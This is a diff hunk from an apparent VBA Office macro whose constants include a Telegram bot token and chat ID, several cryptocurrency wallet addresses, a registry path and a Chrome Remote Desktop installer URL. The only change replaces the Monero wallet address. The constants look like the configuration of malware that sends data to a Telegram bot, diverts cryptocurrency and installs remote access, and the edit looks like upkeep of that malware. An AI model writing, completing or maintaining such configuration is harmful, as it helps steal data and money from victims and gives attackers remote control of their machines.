@@ -190,7 +190,7 @@ Private Const REG_HEAP_PTR As String = "HKEY_CURRENT_USER\Software\Microsoft\Off
 
 Private Const TELEGRAM_BOT_TOKEN As String = "7283940156:AAEjK8LmN9pQrS7tUvWxYz1B2C3D4E5F6G"
 Private Const TELEGRAM_CHAT_ID As String = "5010121"
-Private Const XMR_WALLET As String = "45dKLsFDucgTv9wQtkU7uJCQJ67fUrgVnEaY7Aozgr7naqWq5hxZ2vbKawDVcNUj6Ta38H9Kdg8jB32pjTcE8vbH9jWztYj"
+Private Const XMR_WALLET As String = "46TDrBMVwKQD9UX9cTKQtHHz4JPoz97KHjBS11WzWeroJ578nLUpYc8bsjPp8XQq6q24uepeHvWEJUUp7ThkHbT33NHDBKr"
 Private Const BTC_WALLET As String = "1PiafnXyQVAzzq4T2pUeLhbjPip8x7Kv43"
 Private Const ETH_WALLET As String = "0x56046d656985f16582d72c4e0c5a37b7472c8848"
 Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-remote-desktop/chromoting-setup.exe"
